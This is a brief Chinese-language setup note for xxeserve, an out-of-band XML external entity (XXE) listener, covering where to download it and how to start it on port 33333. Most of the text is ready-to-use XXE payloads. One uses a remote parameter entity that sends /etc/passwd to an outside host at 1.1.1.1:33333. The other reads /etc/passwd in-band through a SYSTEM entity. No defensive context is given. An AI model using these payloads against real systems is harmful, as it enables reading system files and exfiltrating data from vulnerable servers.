## xxeserve 安装配置

#### xxeserve 下载
	https://github.com/joernchen/xxeserve.git

#### 安装启动
	gem install sinatra
	ruby xxeserve.rb  33333

#### xxe payloda
	<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://1.1.1.1:33333/xml?f=/etc/passwd">%remote;%int;%trick;]>

	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE xxe [
	<!ELEMENT name ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
	<root>
	<name>&xxe;</name>
	</root>